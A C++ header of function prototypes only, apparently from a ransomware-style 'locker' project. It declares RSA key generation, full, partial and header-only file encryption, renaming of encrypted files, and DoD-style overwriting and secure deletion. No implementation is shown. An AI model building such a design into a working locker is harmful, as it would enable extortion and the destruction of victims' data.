#ifndef _FILE_SYSTEM_H_
#define _FILE_SYSTEM_H_

#include "locker.h"
#include "structures.h"
#include "pathsystem.h"

namespace filesystem
{
	bool WriteFullData(DESC desc, void* buffer, unsigned size);
	bool ReadRSAFile(CRYPT_INFO* CryptInfo);
	bool OptionEncryptModeAUTO(PFILE_INFO FileInfo);
	bool OptionEncryptModeFULL(PFILE_INFO FileInfo);
	bool OptionEncryptModePARTLY(PFILE_INFO FileInfo);
	bool OptionEncryptModeHEADER(PFILE_INFO FileInfo);
	bool OptionEncryptModeBLOCK(PFILE_INFO FileInfo);
	bool HandlerGenKeyPairRSA();
	bool EncryptRSA(PFILE_INFO FileInfo);
	bool FileCryptEncrypt(PFILE_INFO FileInfo);
	bool FileCryptDecrypt(PFILE_INFO FileInfo);
	bool HashSignatureFile(SLIST<locker::HLIST>* list, DESC HandleHash);
	void sort_hash_list(SLIST<HASH_LIST>* list);
	bool VerifySignatureRSA(SLIST<HASH_LIST>* HashList);
	bool VerificationSignatureFile(SLIST<HASH_LIST>* HashList);
	void RootKeySignatureTrust(VOID);
	PHEAD_BLOCK init_mdata_hblock(PFILE_INFO fileinfo);
	void delete_metadata(DESC filehandle, size_t* filesize);
	void free_hblock_mdata(PHEAD_BLOCK hblock_t);
	void write_metadata(PFILE_INFO fileinfo);
	void sort_hash_list(SLIST<HASH_LIST>* list);
	bool nopHashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, char* Filename);
	bool HashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, char* Filename);
	bool hash_file(PCRYPT_INFO CryptInfo, DESC desc, char* fullpath, char* filename);

	char* NameMethodState(PFILE_INFO fileinfo, PDRIVE_INFO data);
	char* OptionNameStandart(PFILE_INFO fileinfo, char* Filename, char* exst, char* FPath);
	char* OptionNameHash(PFILE_INFO fileinfo, char* Filename, char* exst, char* FPath);
	char* OptionNameBase(PFILE_INFO fileinfo, char* Filename, char* exst, char* FPath);

	bool nopOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool ZerosOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool RandomOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool DODOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool RewriteSDelete(CRYPT_INFO* CryptInfo, char* FullPath);
}

#endif